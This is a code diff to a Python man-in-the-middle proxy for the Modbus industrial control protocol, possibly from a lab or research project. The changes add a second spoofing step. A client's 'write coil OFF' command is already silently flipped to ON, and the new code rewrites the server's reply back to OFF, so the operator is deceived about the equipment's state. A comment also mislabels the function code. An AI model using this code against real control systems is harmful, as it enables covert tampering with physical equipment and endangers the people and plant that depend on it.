@@ -55,7 +55,7 @@ class MITMModbusProxy:
         server_reader, server_writer = await asyncio.open_connection(
             self.server_host, self.server_port
         )
-        print(f">> Connected to server at {self.server_host}:{self.server_port}")
+        print(f">> Connected to server at {self.server_host}:{self.server_port}\n")
         changeData = False
 
         try:
@@ -108,21 +108,27 @@ class MITMModbusProxy:
             await server.serve_forever()
 
     def transform_client_data(self, parsed_data_map):
-        print("transforming client data to spoof server...")
+        # print("transforming client data to spoof server...")
 
         # Case 1: if the function_code is 'Write Single Register' and the value is 0
         if parsed_data_map['function_code'] == 0x05 and parsed_data_map["quantity_of_coils"] == b'\x00\x00':
             old_value = parsed_data_map["quantity_of_coils"]
             parsed_data_map["quantity_of_coils"] = b'\xFF\x00'
             print(f"\t**Spoofing client command: WRITE {old_value} --> WRITE {parsed_data_map["quantity_of_coils"]}")
-
+        
         manipulated_data = self.create_new_command(parsed_data_map)
 
         return manipulated_data
 
     def transform_server_data(self, parsed_response_map):
-        print("transforming server data to spoof client...")
+        # print("transforming server data to spoof client...")
 
+        # Case 1: Response to Client Case 1 (Write Register with value 0)
+        if parsed_response_map['function_code'] == 0x05 and parsed_response_map["quantity_of_coils"] == b'\xff\x00':
+            old_value = parsed_response_map["quantity_of_coils"]
+            parsed_response_map["quantity_of_coils"] = b'\x00\x00'
+            print(f"\t**Spoofing server command: WRITE {old_value} --> WRITE {parsed_response_map["quantity_of_coils"]}\n")
+        
         manipulated_data = self.create_new_command(parsed_response_map)
         return manipulated_data
 
